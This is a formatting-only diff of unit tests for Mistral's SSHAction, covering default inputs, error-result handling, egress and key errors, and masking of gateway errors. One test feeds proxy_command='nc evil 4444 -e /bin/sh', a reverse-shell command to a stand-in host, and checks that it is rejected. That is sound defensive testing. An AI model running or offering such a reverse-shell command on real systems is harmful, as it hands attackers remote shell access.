@@ -22,7 +22,6 @@ import mistral.utils.ssh_utils
 
 
 class SSHActionTest(base.BaseTest):
-
     def test_default_inputs(self):
         cmd = "echo -n ok"
         host = "localhost"
@@ -35,8 +34,8 @@ class SSHActionTest(base.BaseTest):
 
         self.assertEqual("", params['password'], "Password does not match.")
         self.assertIsNone(
-            params['private_key_filename'],
-            "private_key_filename is not None.")
+            params['private_key_filename'], "private_key_filename is not None."
+        )
 
     @mock.patch.object(mistral.utils.ssh_utils, 'execute_command')
     def test_ssh_action(self, mocked_method):
@@ -50,8 +49,9 @@ class SSHActionTest(base.BaseTest):
 
         stdout = action.run(mock_ctx)
 
-        self.assertEqual('ok', stdout,
-                         'stdout from SSH command differs from expected')
+        self.assertEqual(
+            'ok', stdout, 'stdout from SSH command differs from expected'
+        )
 
         mocked_method.assert_called_with(
             cmd=cmd,
@@ -59,7 +59,7 @@ class SSHActionTest(base.BaseTest):
             username=username,
             password='',
             private_key_filename=None,
-            private_key=None
+            private_key=None,
         )
 
     @mock.patch.object(mistral.utils.ssh_utils, 'execute_command')
@@ -70,8 +70,7 @@ class SSHActionTest(base.BaseTest):
         host = "localhost"
         username = "mistral"
         action = std.SSHAction(
-            cmd, host, username,
-            return_result_on_error=True
+            cmd, host, username, return_result_on_error=True
         )
 
         mock_ctx = None
@@ -91,7 +90,7 @@ class SSHActionTest(base.BaseTest):
             username=username,
             password='',
             private_key_filename=None,
-            private_key=None
+            private_key=None,
         )
 
     @mock.patch.object(mistral.utils.ssh_utils, 'execute_command')
@@ -103,8 +102,7 @@ class SSHActionTest(base.BaseTest):
         host = "localhost"
         username = "mistral"
         action = std.SSHAction(
-            cmd, host, username,
-            return_result_on_error=True
+            cmd, host, username, return_result_on_error=True
         )
 
         mock_ctx = None
@@ -118,8 +116,9 @@ class SSHActionTest(base.BaseTest):
         self.assertEqual(1, result['exit_code'])
 
     @mock.patch.object(mistral.utils.ssh_utils, 'execute_command')
-    def test_with_return_result_on_error_exception_handling(self,
-                                                            mocked_method):
+    def test_with_return_result_on_error_exception_handling(
+        self, mocked_method
+    ):
         # Test SSH connection failure handling
         # SHOULD still raise exception
         mocked_method.side_effect = Exception("SSH connection failed")
@@ -127,8 +126,7 @@ class SSHActionTest(base.BaseTest):
         host = "localhost"
         username = "mistral"
         action = std.SSHAction(
-            cmd, host, username,
-            return_result_on_error=True
+            cmd, host, username, return_result_on_error=True
         )
 
         mock_ctx = None
@@ -155,14 +153,13 @@ class SSHActionTest(base.BaseTest):
         # Test multiple hosts with return_result_on_error=True
         mocked_method.side_effect = [
             (0, 'host1 stdout', 'host1 stderr'),
-            (1, 'host2 stdout', 'host2 stderr')
+            (1, 'host2 stdout', 'host2 stderr'),
         ]
         cmd = "echo -n ok"
         host = ["host1", "host2"]
         username = "mistral"
         action = std.SSHAction(
-            cmd, host, username,
-            return_result_on_error=True
+            cmd, host, username, return_result_on_error=True
         )
 
         mock_ctx = None
@@ -196,8 +193,10 @@ class SSHActionTest(base.BaseTest):
     def test_egress_and_key_errors_reach_caller(self, mocked_method):
         action = std.SSHAction('ls', 'localhost', 'user')
 
-        for e in (exc.UrlNotAllowedException('blocked host'),
-                  exc.DataAccessException('outside key dir')):
+        for e in (
+            exc.UrlNotAllowedException('blocked host'),
+            exc.DataAccessException('outside key dir'),
+        ):
             mocked_method.side_effect = e
 
             raised = self.assertRaises(type(e), action.run, None)
@@ -214,16 +213,14 @@ class SSHActionTest(base.BaseTest):
             username='user',
             private_key_filename=None,
             gateway_host='gateway',
-            proxy_command='nc evil 4444 -e /bin/sh'
+            proxy_command='nc evil 4444 -e /bin/sh',
         )
 
         exception = self.assertRaises(exc.ActionException, action.run, None)
 
         self.assertIn("proxy_command is not permitted", str(exception))
 
-    @mock.patch.object(
-        mistral.utils.ssh_utils, 'execute_command_via_gateway'
-    )
+    @mock.patch.object(mistral.utils.ssh_utils, 'execute_command_via_gateway')
     def test_proxied_generic_error_is_still_masked(self, mocked_method):
         # A non-ActionException failure (e.g. a paramiko/host error) must
         # still be masked so it cannot leak information to the caller.
@@ -235,11 +232,12 @@ class SSHActionTest(base.BaseTest):
             username='user',
             private_key_filename=None,
             gateway_host='gateway',
-            proxy_command=None
+            proxy_command=None,
         )
 
         exception = self.assertRaises(exc.ActionException, action.run, None)
 
-        self.assertIn("Failed to execute ssh cmd 'ls' on ['target']",
-                      str(exception))
+        self.assertIn(
+            "Failed to execute ssh cmd 'ls' on ['target']", str(exception)
+        )
         self.assertNotIn('sensitive gateway detail', str(exception))
